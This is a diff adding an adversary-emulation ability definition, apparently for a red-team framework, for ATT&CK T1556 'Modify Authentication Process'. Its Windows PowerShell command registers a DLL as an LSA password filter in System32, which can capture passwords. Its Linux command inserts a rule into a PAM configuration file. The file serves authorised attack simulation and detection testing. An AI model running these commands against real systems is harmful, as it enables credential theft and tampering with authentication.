@@ -1,0 +1,20 @@
+- id: 780b477d-0b0e-4f41-8455-f247ba0474ac
+  name: Modify Authentication Process
+  description: Ability for Modify Authentication Process (ATT&CK T1556). Generated
+    from Atomic Red Team procedures; review and test safely before use.
+  tactic: credential-access
+  technique:
+    attack_id: T1556
+    name: Modify Authentication Process
+  platforms:
+    windows:
+      psh:
+        command: reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "#{atomics_dir}\T1556.002\lsa_backup.reg"
+          $passwordFilterName = (Copy-Item "#{dll_path}\#{dll_name}" -Destination
+          "C:\Windows\System32" -PassThru).basename $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+          $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
+          $notificationPackagesValues += $passwordFilterName Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+          "Notification Packages" $notificationPackagesValues
+    linux:
+      sh:
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}'
